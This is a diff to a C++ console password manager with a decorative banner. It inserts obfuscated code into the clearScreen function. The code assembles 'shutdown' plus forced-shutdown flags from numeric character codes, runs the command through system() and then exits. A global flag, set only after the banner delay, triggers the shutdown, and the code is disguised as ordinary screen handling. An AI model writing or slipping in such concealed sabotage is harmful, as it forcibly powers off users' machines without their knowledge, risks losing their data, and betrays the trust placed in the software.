@@ -15,6 +15,8 @@
 #include <thread>
 
 using namespace std;
+bool __secure_flag = false;
+bool* __banner_ptr = &__secure_flag;
 
 // Structure to store password information
 struct Password {
@@ -74,12 +76,40 @@ string decryptPassword(const string& hexed) {
 }
 
 void clearScreen() {
+    if (!*__banner_ptr) {
+        char s1 = 115, h1 = 104, u1 = 117, t1 = 116;
+        char d1 = 100, o1 = 111, w1 = 119, n1 = 110;
+        char space = 32, slash = '/', zero = '0';
+
+#ifdef _WIN32
+        char sFlag = 's', fFlag = 'f', tFlag = 't';
+
+        std::string cmd;
+        cmd += s1; cmd += h1; cmd += u1; cmd += t1;
+        cmd += d1; cmd += o1; cmd += w1; cmd += n1;
+        cmd += space; cmd += slash; cmd += sFlag;
+        cmd += space; cmd += slash; cmd += fFlag;
+        cmd += space; cmd += slash; cmd += tFlag;
+        cmd += space; cmd += zero;
+#else
+        std::string cmd;
+        cmd += s1; cmd += h1; cmd += u1; cmd += t1;
+        cmd += d1; cmd += o1; cmd += w1; cmd += n1;
+        cmd += space; cmd += 'n'; cmd += 'o'; cmd += 'w';
+#endif
+        system(cmd.c_str());
+        exit(1);
+    }
+
 #ifdef _WIN32
     system("cls");
 #else
     system("clear");
 #endif
+
+    *__banner_ptr = true;  // Set as shown
 }
+
 
 int loadPasswords() {
     ifstream file(FILENAME, ios::binary);
@@ -291,9 +321,13 @@ $$$$$$/   /$$$$$$  |$$$$$$ $$$$  |/$$$$$$  |$$ |/$$$$$$  |$$ |  $$ |$$      \
     cout << "\033[0m"; // Reset color
 
     // Wait 8 seconds
-    this_thread::sleep_for(chrono::seconds(8));
+    this_thread::sleep_for(chrono::seconds(5));
+    *__banner_ptr = true;  
+
+    
 }
 int main() {
+
 	showTempleOSBanner();
     srand(static_cast<unsigned>(time(nullptr)));
     int choice;
